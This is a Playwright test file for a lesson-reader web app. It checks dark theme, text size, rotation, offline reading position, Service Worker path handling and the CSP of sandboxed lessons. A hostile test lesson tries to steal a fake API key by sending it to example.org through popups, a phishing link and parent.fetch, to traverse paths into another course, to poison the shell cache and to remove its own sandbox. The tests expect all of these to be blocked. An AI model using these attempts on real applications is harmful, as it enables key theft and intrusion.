// T-010 (tester): independent checks of T-009 (lesson in a sandboxed iframe,
// D-011): dark theme, text size, rotation without an inner scroll, offline,
// reading position after a reload, more Service Worker path cases, more CSP
// cases, and what a script in a lesson can really do to the app.
//
// Known defects were marked test.fail() with their id from the T-010 log
// (T010-S1, T010-D2). T-045 (D-029: the lesson in an opaque origin) fixed
// them: test.fail is removed and the attacks are wrapped so that a blocked
// attempt (SecurityError) is an outcome, not a test error.
//
// Synthetic data only (D-026): tests/fixtures/LRN-DEMO and a tiny hostile
// course LRN-EVIL built in memory here.
// Optional: T010_REAL_DIR=<course folder outside the repo> runs the same
// reader checks on lesson 0001 of a real course; T010_SHOTS=<folder outside
// the repo> saves screenshots there.
import { test, expect } from '@playwright/test';
import { existsSync, mkdirSync } from 'node:fs';
import { basename, join } from 'node:path';
import { DRIVE_ZIP_NAME, readFixture, makeZip, asFile } from '../fixtures/zips.mjs';
import { strToU8 } from '../../vendor/fflate.js';

const FILES = readFixture();
const SHOTS = process.env.T010_SHOTS;
const REAL = process.env.T010_REAL_DIR;
const FAKE_KEY = 'sk-ant-T010-FAKE-KEY';

let problems;
let allowed;
let leaked; // requests to example.org that really left (finished)
test.beforeEach(async ({ page, context }) => {
  problems = [];
  allowed = [];
  leaked = [];
  page.on('console', (m) => { if (m.type() === 'error') problems.push(m.text()); });
  page.on('pageerror', (e) => problems.push(String(e)));
  context.on('requestfinished', (q) => { if (/example\.org|api\.anthropic\.com/.test(q.url())) leaked.push(q.url()); });
  await context.route(/^https?:\/\/(?!localhost)/, (route) => route.fulfill({ status: 200, contentType: 'text/html', body: '<p>external</p>' }));
  await page.goto('./');
  await expect(page.locator('[data-screen="courses"]')).toBeVisible();
  await page.evaluate(() => navigator.serviceWorker.ready.then(() => true));
  await page.reload();
  expect(await page.evaluate(() => !!navigator.serviceWorker.controller)).toBe(true);
});
test.afterEach(() => {
  expect(problems.filter((p) => !allowed.some((re) => re.test(p)))).toEqual([]);
});

async function importFiles(page, files) {
  return page.evaluate(async (files) => {
    const m = await import('./src/course-import.js');
    const list = files.map((f) => new File([new Uint8Array(f.bytes)], f.name));
    return m.describeSummary(await m.importCourse(list));
  }, files.map((f) => ({ name: f.name, bytes: [...f.buffer] })));
}
const importDemo = (page) => importFiles(page, [asFile(DRIVE_ZIP_NAME, makeZip(FILES))]);

const lf = (page) => page.frameLocator('iframe.lesson-frame');
// Match the iframe by its own path (the app URL has "#/c/<course>/…" in its hash).
const frameOf = (page, course) => page.frames().find((f) => f.url().includes(`/EasyLRN/c/${course}/`));

async function open(page, course, number = '0001') {
  // Through the course screen: the same hash route twice would not render the reader again.
  await page.goto(`./#/c/${course}`);
  await page.goto(`./#/c/${course}/read/${number}`);
  await expect(lf(page).locator('h1').first()).toBeVisible();
  // T-045: the bridge answered and the app sent the settings (text size, colours).
  await expect(page.locator('[data-lesson-state="ready"]')).toBeVisible();
  await page.locator('iframe.lesson-frame').evaluate(() => new Promise((r) => setTimeout(r, 200)));
}

/** Layout facts of the reader: iframe vs. its document, inner scroll, horizontal overflow. */
async function layout(page, course) {
  const f = frameOf(page, course);
  const frameH = await page.locator('iframe.lesson-frame').evaluate((el) => el.getBoundingClientRect().height);
  const doc = await f.evaluate(() => ({
    h: document.documentElement.getBoundingClientRect().height,
    innerY: document.scrollingElement.scrollHeight - innerHeight,
    innerX: document.scrollingElement.scrollWidth - innerWidth,
  }));
  const app = await page.evaluate(() => ({ overflowX: document.scrollingElement.scrollWidth - innerWidth }));
  return { diff: Math.abs(frameH - doc.h), innerY: doc.innerY, innerX: doc.innerX, appX: app.overflowX, frameH };
}

async function shot(page, name) {
  if (!SHOTS) return;
  mkdirSync(SHOTS, { recursive: true });
  await page.screenshot({ path: join(SHOTS, `${name}.png`) });
}

// --- Display ------------------------------------------------------------------

test.describe('T-010 display', () => {
  test('dark theme: app and lesson follow the system; light again after switching back', async ({ page }) => {
    await importDemo(page);
    for (const scheme of ['dark', 'light']) {
      await page.emulateMedia({ colorScheme: scheme });
      await open(page, 'LRN-DEMO');
      const f = frameOf(page, 'LRN-DEMO');
      const lum = (rgb) => { const [r, g, b] = rgb.match(/\d+/g).map(Number); return 0.2126 * r + 0.7152 * g + 0.0722 * b; };
      const appBg = await page.evaluate(() => getComputedStyle(document.body).backgroundColor);
      const lessonBg = await f.evaluate(() => getComputedStyle(document.body).backgroundColor);
      const lessonInk = await f.evaluate(() => getComputedStyle(document.body).color);
      const dark = scheme === 'dark';
      expect(lum(appBg) < 80).toBe(dark);
      expect(lum(lessonBg) < 80).toBe(dark);
      // Readable: text clearly differs from the background.
      expect(Math.abs(lum(lessonInk) - lum(lessonBg))).toBeGreaterThan(100);
      expect(await f.evaluate(() => matchMedia('(prefers-color-scheme: dark)').matches)).toBe(dark);
      await shot(page, `demo-${scheme}-${page.viewportSize().width}x${page.viewportSize().height}`);
    }
  });

  test('text size 1.0 / 1.25 / 1.5: the lesson root font follows and the frame grows, no inner scroll', async ({ page }) => {
    await importDemo(page);
    let last = 0;
    for (const scale of [1, 1.25, 1.5]) {
      await page.evaluate(async (s) => (await import('./src/db.js')).saveSettings({ fontScale: s }), scale);
      await open(page, 'LRN-DEMO');
      const f = frameOf(page, 'LRN-DEMO');
      expect(await f.evaluate(() => getComputedStyle(document.documentElement).fontSize)).toBe(`${18 * scale}px`);
      await expect.poll(async () => (await layout(page, 'LRN-DEMO')).diff).toBeLessThan(2);
      const l = await layout(page, 'LRN-DEMO');
      expect(l.innerY).toBeLessThanOrEqual(1);
      expect(l.frameH).toBeGreaterThan(last);
      last = l.frameH;
    }
  });

  test('rotation landscape ↔ portrait (1920×1200, 1200×1920, 1280×800, 800×1280): no inner scroll, no sideways scroll', async ({ page }, info) => {
    test.skip(info.project.name !== 'tablet-landscape', 'one run covers all sizes');
    await importDemo(page);
    await open(page, 'LRN-DEMO');
    for (const [w, h] of [[1920, 1200], [1200, 1920], [1920, 1200], [1280, 800], [800, 1280], [1280, 800]]) {
      await page.setViewportSize({ width: w, height: h });
      await expect.poll(async () => (await layout(page, 'LRN-DEMO')).diff, { message: `${w}×${h}` }).toBeLessThan(2);
      const l = await layout(page, 'LRN-DEMO');
      expect(l.innerY, `${w}×${h} inner vertical scroll`).toBeLessThanOrEqual(1);
      expect(l.innerX, `${w}×${h} inner sideways scroll`).toBeLessThanOrEqual(1);
      expect(l.appX, `${w}×${h} app sideways scroll`).toBeLessThanOrEqual(1);
      await shot(page, `demo-rotate-${w}x${h}`);
    }
  });

  test('reading position survives a full reload of the app and going offline', async ({ page, context }) => {
    await importDemo(page);
    await open(page, 'LRN-DEMO');
    const target = await page.evaluate(() => Math.min(800, document.scrollingElement.scrollHeight - innerHeight - 40));
    await page.evaluate((y) => window.scrollTo(0, y), target);
    await page.waitForTimeout(700); // throttle 400 ms
    await context.setOffline(true);
    try {
      await page.reload();
      await page.goto('./#/c/LRN-DEMO/read/0001');
      await expect(lf(page).locator('h1')).toBeVisible();
      await expect.poll(() => page.evaluate(() => scrollY)).toBeGreaterThan(target - 60);
      expect(Math.abs(await page.evaluate(() => scrollY) - target)).toBeLessThan(60);
    } finally {
      await context.setOffline(false);
    }
  });
});

test.describe('T-010 reading position between two readers', () => {
  test('[T010-D2] a quick Back from R01 to the lesson does not overwrite the saved position of R01', async ({ page }, info) => {
    test.skip(info.project.name !== 'tablet-landscape', 'one size is enough');
    // Longer files (in memory) so that both scroll.
    const refPath = 'reference/R01-temperatura-i-vreme.html';
    const pad = (path, px) => strToU8(new TextDecoder().decode(FILES[path]).replace('</body>', `<div style="height:${px}px"></div></body>`));
    // Like the real course: the lesson is much longer than the reference.
    await importFiles(page, [asFile(DRIVE_ZIP_NAME, makeZip({ ...FILES, [refPath]: pad(refPath, 1500), 'lessons/0001-vidove-chay.html': pad('lessons/0001-vidove-chay.html', 4000) }))]);
    const ref = async () => page.evaluate(async () => (await (await import('./src/db.js')).getLesson('LRN-DEMO/reference/R01-temperatura-i-vreme.html')).progress?.scrollY ?? 0);
    const saved = [];
    for (let i = 0; i < 3; i++) {
      await open(page, 'LRN-DEMO');
      await page.waitForTimeout(1600); // the lesson has restored its own position
      await page.evaluate(() => window.scrollTo(0, document.scrollingElement.scrollHeight));
      await page.waitForTimeout(600);
      await lf(page).locator('a', { hasText: 'R01 Температура и време' }).click();
      await expect(page).toHaveURL(/read\/R01$/);
      await expect(lf(page).locator('h1')).toHaveText('Температура и време за запарване');
      // Back at once (before R01 has finished restoring its position, ≤ 1.5 s).
      await page.goBack();
      await expect(page).toHaveURL(/read\/0001$/);
      await page.waitForTimeout(800);
      saved.push(await ref());
    }
    expect(saved).toEqual([0, 0, 0]); // R01 was never scrolled by the user
  });
});

// --- Service Worker paths -------------------------------------------------------

test.describe('T-010 Service Worker paths (more cases)', () => {
  test('odd encodings never serve another course, the app source or a 500', async ({ page }) => {
    allowed = [/status of 40[04]/];
    await importDemo(page);
    await importFiles(page, [asFile('LRN-OTHER.zip', makeZip({ 'INDEX.md': strToU8('# I'), 'secret.md': strToU8('OTHER-SECRET') }, { root: 'LRN-OTHER' }))]);
    const r = await page.evaluate(async () => {
      const probe = async (u) => {
        const res = await fetch(u);
        const t = await res.text();
        const tag = t.includes('OTHER-SECRET') ? ' SECRET' : /serviceWorker|import \{/.test(t) ? ' APPSRC' : '';
        const csp = res.headers.get('content-security-policy')?.includes("connect-src 'none'") ? '' : ' NOCSP';
        return `${res.status}${tag}${res.status < 300 || res.status >= 400 ? csp : ''}`;
      };
      const urls = [
        './c/LRN-DEMO/MISSION.md',
        './c/LRN-DEMO/MISSION.md?x=1#y', // query and hash are ignored
        './c/LRN-DEMO//MISSION.md', // empty segment
        './c/LRN-DEMO/lessons/%2E%2E/MISSION.md', // upper-case %2E: URL parser resolves → in course
        './c/LRN-DEMO/%2E%2E%2FLRN-OTHER/secret.md',
        './c/LRN-DEMO/%25252e%25252e/LRN-OTHER/secret.md', // triple encoding: literal key, not found
        './c/LRN-DEMO/%c0%ae%c0%ae/LRN-OTHER/secret.md', // overlong UTF-8 dot: invalid
        './c/LRN-DEMO/%EF%BC%8E%EF%BC%8E/LRN-OTHER/secret.md', // fullwidth dots: just a name
        './c/LRN-DEMO/..%5CLRN-OTHER%5Csecret.md',
        './c/LRN-DEMO/lessons/x%00.html',
        './c/LRN-DEMO/lessons/x%2500.html', // double-encoded NUL
        './c/LRN-DEMO/%20/MISSION.md',
        './c/lrn-demo/MISSION.md', // course id is case-sensitive
        './c/LRN-OTHER/secret.md', // that course's own URL
        './c/LRN-DEMO/' + 'a/'.repeat(200) + 'x.md', // very long path
        './c/%2e%2e/src/db.js',
        './c/LRN-DEMO%5c..%5csrc/db.js',
        './c/.hidden/x.md',
      ];
      const out = {};
      for (const u of urls) out[u.length > 80 ? 'long' : u] = await probe(u);
      return out;
    });
    expect(r).toEqual({
      './c/LRN-DEMO/MISSION.md': '200',
      './c/LRN-DEMO/MISSION.md?x=1#y': '200',
      './c/LRN-DEMO//MISSION.md': '400',
      './c/LRN-DEMO/lessons/%2E%2E/MISSION.md': '200',
      './c/LRN-DEMO/%2E%2E%2FLRN-OTHER/secret.md': '400',
      './c/LRN-DEMO/%25252e%25252e/LRN-OTHER/secret.md': '404',
      './c/LRN-DEMO/%c0%ae%c0%ae/LRN-OTHER/secret.md': '400',
      './c/LRN-DEMO/%EF%BC%8E%EF%BC%8E/LRN-OTHER/secret.md': '404',
      './c/LRN-DEMO/..%5CLRN-OTHER%5Csecret.md': '400',
      './c/LRN-DEMO/lessons/x%00.html': '400',
      './c/LRN-DEMO/lessons/x%2500.html': '400',
      './c/LRN-DEMO/%20/MISSION.md': '404',
      './c/lrn-demo/MISSION.md': '404',
      './c/LRN-OTHER/secret.md': '200 SECRET',
      long: '404',
      './c/%2e%2e/src/db.js': '200 APPSRC NOCSP', // the URL parser makes it ./src/db.js: the public app file, not a course file
      './c/LRN-DEMO%5c..%5csrc/db.js': '400',
      './c/.hidden/x.md': '400',
    });
  });

  test('a course file is never served from the shell cache or the network, even on SW-bypassing requests', async ({ page }) => {
    allowed = [/status of 404/];
    await importDemo(page);
    // Fetch with cache: 'reload' still goes through the SW (only a hard reload bypasses it).
    const r = await page.evaluate(async () => {
      const a = await fetch('./c/LRN-DEMO/MISSION.md', { cache: 'reload' });
      const b = await fetch('./c/LRN-DEMO/nope.md', { cache: 'no-store' });
      return [a.status, a.headers.get('cache-control'), b.status, (await b.text()).includes('easylrn-error')];
    });
    expect(r).toEqual([200, 'no-store', 404, true]);
  });
});

// --- CSP of course responses (more cases) -------------------------------------

test.describe('T-010 CSP of the lesson (more cases)', () => {
  test('EventSource, SharedWorker, blob: Worker, prefetch link, external iframe/video/CSS image, form, self-navigation: nothing leaves', async ({ page }) => {
    allowed = [/Content Security Policy|Refused to|Framing|violates|allow-forms/i, /status of 40/];
    await importDemo(page);
    await open(page, 'LRN-DEMO');
    const f = frameOf(page, 'LRN-DEMO');
    const r = await f.evaluate(async () => {
      const v = new Set();
      document.addEventListener('securitypolicyviolation', (e) => v.add(e.effectiveDirective));
      const attempt = async (fn) => { try { await fn(); return 'allowed'; } catch { return 'blocked'; } };
      const out = {
        eventSource: await attempt(() => new Promise((res, rej) => { const s = new EventSource('https://example.org/es'); s.onopen = res; s.onerror = rej; })),
        sharedWorker: await attempt(() => new Promise((res) => { new SharedWorker('../assets/quiz.js'); setTimeout(res, 300); })),
        blobWorker: await attempt(() => new Promise((res) => { new Worker(URL.createObjectURL(new Blob(['1'], { type: 'text/javascript' }))); setTimeout(res, 300); })),
      };
      const add = (html) => { const d = document.createElement('div'); d.innerHTML = html; document.body.append(d); };
      add('<link rel="prefetch" href="https://example.org/prefetch"><link rel="stylesheet" href="https://example.org/s.css">');
      add('<iframe src="https://example.org/frame"></iframe><video src="https://example.org/v.mp4"></video><audio src="https://example.org/a.mp3"></audio>');
      add('<div style="background:url(https://example.org/bg.png);width:10px;height:10px"></div>');
      add('<object data="https://example.org/o"></object><embed src="https://example.org/e">');
      const form = document.createElement('form'); form.action = 'https://example.org/form'; form.method = 'POST'; document.body.append(form);
      out.form = await attempt(() => form.submit());
      await new Promise((r) => setTimeout(r, 800));
      return { out, v: [...v].sort() };
    });
    expect(r.out.eventSource).toBe('blocked');
    expect(r.out.blobWorker).toBe('allowed'); // constructor does not throw; CSP refuses it (worker-src) — no request anyway
    // object-src: since T-048-fix the guard removes the <object>/<embed> before it
    // loads (no violation to report, nothing leaves either way).
    expect(r.v).toEqual(expect.arrayContaining(['connect-src', 'img-src', 'worker-src', 'frame-src', 'style-src-elem', 'media-src']));
    // Self-navigation of the lesson frame to another site (the T-009 log thought this was
    // an open channel): the app's own frame-src 'self' blocks it, nothing leaves.
    await f.evaluate(() => { location.href = 'https://example.org/selfnav?k=1'; });
    await page.waitForTimeout(1000);
    await expect(lf(page).locator('h1')).toBeVisible();
    expect(leaked).toEqual([]);
  });

  test('a lesson cannot navigate top with top.location / parent.location.hash, nor submit a form from the app', async ({ page }) => {
    allowed = [/Unsafe attempt|not allowed|sandbox|form-action|Content Security Policy/i];
    await importDemo(page);
    await open(page, 'LRN-DEMO');
    const f = frameOf(page, 'LRN-DEMO');
    const r = await f.evaluate(() => {
      const out = {};
      try { top.location.href = 'https://example.org/top'; out.top = 'set'; } catch (e) { out.top = e.name; }
      try { parent.location.hash = '#/settings'; out.hash = 'set'; } catch (e) { out.hash = e.name; }
      try {
        const fm = parent.document.createElement('form'); fm.action = 'https://example.org/f'; parent.document.body.append(fm); fm.submit(); fm.remove();
        out.form = 'submitted';
      } catch (e) { out.form = e.name; }
      return out;
    });
    // T-045: the lesson cannot even reach parent.document (opaque origin).
    expect(r).toEqual({ top: 'SecurityError', hash: 'SecurityError', form: 'SecurityError' });
    await page.waitForTimeout(800);
    expect(page.url()).toMatch(/\/EasyLRN\/#\/c\/LRN-DEMO\/read\/0001$/);
    expect(leaked).toEqual([]);
  });
});

// --- What a lesson script can do to the app (T010-S1, D-011) ------------------

const EVIL_LESSON = `<!DOCTYPE html><html lang="bg"><head><meta charset="utf-8"><title>Урок</title></head>
<body><h1>Урок</h1><button id="go" onclick="window.__clicked = 1">Напред</button><p style="height:1500px">…</p></body></html>`;
const EVIL = {
  'INDEX.md': strToU8('# INDEX\n'),
  'lessons/0001-urok.html': strToU8(EVIL_LESSON),
  'assets/x.js': strToU8('window.__fromLesson = document.title;'),
};

async function openEvil(page) {
  await page.evaluate(async (k) => (await import('./src/db.js')).saveSettings({ apiKey: k }), FAKE_KEY);
  await importFiles(page, [asFile('LRN-EVIL.zip', makeZip(EVIL, { root: 'LRN-EVIL' }))]);
  await open(page, 'LRN-EVIL');
  return frameOf(page, 'LRN-EVIL');
}

test.describe('T010-S1: a lesson script cannot reach the app (T-045: opaque origin, D-029)', () => {
  test('facts: the lesson cannot read the app DOM, localStorage, the API key in IndexedDB or the shell cache', async ({ page }) => {
    const f = await openEvil(page);
    const r = await f.evaluate(async () => {
      const attempt = async (fn) => { try { return await fn(); } catch (e) { return `blocked:${e.name}`; } };
      return {
        origin: self.origin,
        parentTitle: await attempt(() => parent.document.querySelector('#app-bar-title')?.textContent),
        frameElement: await attempt(() => (window.frameElement === null ? 'null' : 'element')),
        localStorage: await attempt(() => localStorage.getItem('x')),
        apiKey: await attempt(() => new Promise((ok, fail) => {
          const req = indexedDB.open('lrn-app');
          req.onerror = () => fail(req.error);
          req.onsuccess = () => {
            try {
              const g = req.result.transaction('settings').objectStore('settings').get('settings');
              g.onsuccess = () => ok(g.result?.apiKey ?? 'no key');
            } catch (e) { ok('no lrn-app store'); }
          };
          req.onupgradeneeded = () => ok('empty db');
        })),
        caches: await attempt(async () => (await caches.keys()).join(',')),
      };
    });
    expect(r.origin).toBe('null');
    expect(r.parentTitle).toMatch(/^blocked:SecurityError/);
    expect(r.frameElement).toBe('null');
    expect(r.localStorage).toMatch(/^blocked:/);
    expect(r.apiKey).toMatch(/^blocked:/);
    expect(r.caches).toMatch(/^blocked:/);
    expect(JSON.stringify(r)).not.toContain(FAKE_KEY);
  });

  test('[T010-S1a] the key cannot leave through parent.open() (a popup with data in the URL)', async ({ page, context }) => {
    allowed = [/Blocked opening .* sandboxed frame whose 'allow-popups' permission is not set/];
    const f = await openEvil(page);
    const popup = context.waitForEvent('page', { timeout: 3000 }).catch(() => null);
    await f.evaluate((k) => {
      try { parent.open(`https://example.org/leak?k=${k}`); } catch { /* blocked */ }
      try { window.open(`https://example.org/leak2?k=${k}`); } catch { /* blocked */ }
    }, FAKE_KEY);
    await popup;
    await page.waitForTimeout(500);
    expect(leaked.filter((u) => u.includes(FAKE_KEY))).toEqual([]);
  });

  test('[T010-S1b] the lesson cannot navigate the app away by clicking a link it puts in the app document', async ({ page }) => {
    const f = await openEvil(page);
    await f.evaluate((k) => {
      try {
        const a = parent.document.createElement('a');
        a.href = `https://example.org/phish?k=${k}`;
        parent.document.body.append(a);
        a.click();
      } catch { /* blocked */ }
    }, FAKE_KEY);
    await page.waitForTimeout(1000);
    expect(page.url()).toMatch(/\/EasyLRN\//);
  });

  test('[T010-S1c] the lesson cannot remove the sandbox of its own iframe', async ({ page }) => {
    // location.reload() of a sandboxed lesson does not go through the Service Worker (404 from the
    // server); the app then loads the lesson again. top.location is refused.
    allowed = [/status of 404/, /Unsafe attempt to initiate navigation/];
    const f = await openEvil(page);
    await f.evaluate(() => {
      try { parent.document.querySelector('iframe.lesson-frame').removeAttribute('sandbox'); } catch { /* blocked */ }
      try { window.frameElement?.removeAttribute('sandbox'); } catch { /* blocked */ }
      location.reload();
    });
    await page.waitForTimeout(1000);
    const f2 = frameOf(page, 'LRN-EVIL');
    await f2?.evaluate(() => { top.location.href = 'https://example.org/top-unsandboxed'; }).catch(() => {});
    await expect(page.locator('iframe.lesson-frame')).toHaveAttribute('sandbox', 'allow-scripts');
    await page.waitForTimeout(1000);
    expect(page.url()).toMatch(/\/EasyLRN\//);
  });

  test('[T010-S1d] the lesson cannot run a script in the app (script element in the app document)', async ({ page }) => {
    const f = await openEvil(page);
    const r = await f.evaluate(() => new Promise((ok) => {
      try {
        const s = parent.document.createElement('script');
        s.src = './c/LRN-EVIL/assets/x.js';
        s.onload = () => ok(parent.__fromLesson ?? 'not run');
        s.onerror = () => ok('blocked');
        parent.document.head.append(s);
      } catch { ok('blocked'); }
    }));
    expect(r).toBe('blocked');
  });

  test('[T010-S1e] the lesson cannot replace the app shell in the cache (persists after the course is gone)', async ({ page }) => {
    const f = await openEvil(page);
    const r = await f.evaluate(async () => {
      try {
        const key = (await caches.keys()).find((k) => k.startsWith('easylrn-shell-'));
        const cache = await caches.open(key);
        await cache.put(new URL('../../../index.html', location.href).href,
          new Response('<!DOCTYPE html><title>PWNED</title><p>PWNED</p>', { headers: { 'Content-Type': 'text/html' } }));
        return 'replaced';
      } catch (e) { return e.name; }
    });
    expect(r).toBe('SecurityError');
    // The course is deleted (as far as the app can: soft delete) and the app is reopened.
    await page.goto('./');
    await page.waitForTimeout(300);
    expect(await page.title()).not.toBe('PWNED');
  });

  test('[T010-S1f] the lesson cannot call the Claude API with the key (parent.fetch is outside the lesson CSP)', async ({ page }) => {
    const f = await openEvil(page);
    const r = await f.evaluate(async (k) => {
      try {
        const res = await parent.fetch('https://api.anthropic.com/v1/messages', { method: 'POST', headers: { 'x-api-key': k }, body: '{}' });
        return `sent ${res.status}`;
      } catch { return 'blocked'; }
    }, FAKE_KEY);
    expect(r).toBe('blocked');
  });

  test('a style @import reaches nobody, not even fonts.googleapis.com (Н-1 closed by D-031)', async ({ page, context }) => {
    allowed = [/Content Security Policy|violates/i];
    const google = [];
    // A request the CSP refuses is still reported as `request` (then `requestfailed: csp`): count the ones that finished.
    context.on('requestfinished', (q) => { if (q.url().includes('fonts.googleapis.com')) google.push(q.url()); });
    const refused = [];
    context.on('requestfailed', (q) => { if (q.url().includes('fonts.googleapis.com')) refused.push(q.failure()?.errorText); });
    const f = await openEvil(page);
    await f.evaluate(() => {
      const s = document.createElement('style');
      s.textContent = "@import url('https://fonts.googleapis.com/css2?family=T010LEAK'); @import url('https://example.org/x.css');";
      document.head.append(s);
    });
    await page.waitForTimeout(800);
    expect(refused.length).toBeGreaterThan(0);
    expect(google).toEqual([]); // T-045/D-031: the lesson CSP has no Google Fonts any more (was observation Н-1)
    expect(leaked).toEqual([]);
  });
});

// --- The real lesson 0001 (outside the repository) ---------------------------

test.describe('T-010 real lesson (T010_REAL_DIR, outside the repository)', () => {
  test('quiz, reflect, R01 link, external link, position, offline, rotation, light/dark', async ({ page, context }, info) => {
    test.skip(!REAL || !existsSync(REAL) || info.project.name !== 'tablet-landscape', 'needs T010_REAL_DIR');
    test.setTimeout(120_000);
    allowed = [/fonts\.g|ERR_|status of 40/];
    const root = basename(REAL.replace(/[\\/]+$/, ''));
    const real = readFixture(REAL);
    const summary = await importFiles(page, [asFile(`${root}.zip`, makeZip(real, { root }))]);
    expect(summary).toMatch(/импортиран/);
    await page.goto(`./#/c/${root}`);
    await page.locator('a.lesson-link').first().click();
    await expect(lf(page).locator('h1').first()).toBeVisible();
    const lessonUrl = page.url();

    // quiz.js of the course (T-046: since D-032 a lesson may have no quiz inside; quizzes/*.json instead)
    const quizzes = lf(page).locator('.quiz');
    const hasQuiz = (await quizzes.count()) > 0;
    if (hasQuiz) {
      const q = quizzes.first();
      await q.locator('.opt').first().click();
      await expect(q.locator('.quiz-fb')).toBeVisible();
      await q.locator('.quiz-controls .btn').first().click();
      await expect(q.locator('.quiz-meta')).toContainText('2 /');
    }
    // reflect.js of the course
    const rf = lf(page).locator('.reflect').first();
    await rf.locator('textarea').first().fill('T010 отговор');
    await rf.locator('button', { hasText: 'Копирай' }).click();
    await expect(rf.locator('textarea[readonly]')).toHaveValue(/T010 отговор/);

    // external link → new tab, the lesson stays
    const ext = lf(page).locator('a[href^="https://"]:not([href*="claude.ai"])').first();
    const popup = context.waitForEvent('page');
    await ext.click();
    const tab = await popup;
    expect(tab.url()).toMatch(/^https:\/\//);
    expect(await tab.evaluate(() => window.opener)).toBe(null);
    await tab.close();
    expect(page.url()).toBe(lessonUrl);

    // claude.ai artifact link → the local reference in the app; Back returns
    await lf(page).locator('a[href^="https://claude.ai/artifact/"]').first().click();
    await expect(page).toHaveURL(new RegExp(`#/c/${root}/read/R\\d+$`));
    await expect(lf(page).locator('h1').first()).toBeVisible();
    await page.goBack();
    await expect(page).toHaveURL(lessonUrl);
    await expect(lf(page).locator('h1').first()).toBeVisible();

    // rotation and themes
    for (const scheme of ['light', 'dark']) {
      await page.emulateMedia({ colorScheme: scheme });
      for (const [w, h] of [[1920, 1200], [1200, 1920], [1280, 800], [800, 1280]]) {
        await page.setViewportSize({ width: w, height: h });
        await page.evaluate(() => window.scrollTo(0, 0));
        await expect.poll(async () => (await layout(page, root)).diff, { message: `${scheme} ${w}×${h}` }).toBeLessThan(2);
        const l = await layout(page, root);
        expect(l.innerY, `${scheme} ${w}×${h}`).toBeLessThanOrEqual(1);
        expect(l.innerX, `${scheme} ${w}×${h}`).toBeLessThanOrEqual(1);
        expect(l.appX, `${scheme} ${w}×${h}`).toBeLessThanOrEqual(1);
        await shot(page, `real-${scheme}-${w}x${h}-top`);
        if (w === 1920 || w === 1200) {
          await page.evaluate(() => window.scrollTo(0, document.scrollingElement.scrollHeight * 0.45));
          await page.waitForTimeout(150);
          await shot(page, `real-${scheme}-${w}x${h}-middle`);
        }
      }
    }
    await page.emulateMedia({ colorScheme: 'light' });
    await page.setViewportSize({ width: 1920, height: 1200 });

    // reading position: scroll, leave, reload offline, come back
    const target = await page.evaluate(() => Math.round(document.scrollingElement.scrollHeight * 0.4));
    await page.evaluate((y) => window.scrollTo(0, y), target);
    await page.waitForTimeout(700);
    await context.setOffline(true);
    try {
      await page.goto(`./#/c/${root}`);
      await page.reload();
      await page.locator('a.lesson-link').first().click();
      await expect(lf(page).locator('h1').first()).toBeVisible();
      await expect.poll(() => page.evaluate(() => scrollY)).toBeGreaterThan(target - 80);
      expect(Math.abs(await page.evaluate(() => scrollY) - target)).toBeLessThan(80);
      // offline: the quiz still works, R01 opens
      if (hasQuiz) {
        await lf(page).locator('.quiz').first().locator('.opt').first().click();
        await expect(lf(page).locator('.quiz').first().locator('.quiz-fb')).toBeVisible();
      }
      await lf(page).locator('a[href^="https://claude.ai/artifact/"]').first().click();
      await expect(page).toHaveURL(new RegExp(`#/c/${root}/read/R\\d+$`));
      await expect(lf(page).locator('h1').first()).toBeVisible();
      // R01 opens at its own saved position (or its top), not where the lesson was.
      const refSaved = await page.evaluate(async (c) => (await (await import('./src/db.js')).listLessons(c)).find((l) => /^R/.test(l.number))?.progress?.scrollY ?? 0, root);
      await page.waitForTimeout(1600);
      expect(Math.abs(await page.evaluate(() => scrollY) - refSaved)).toBeLessThan(80);
      await shot(page, 'real-offline-R01');
    } finally {
      await context.setOffline(false);
    }
  });
});
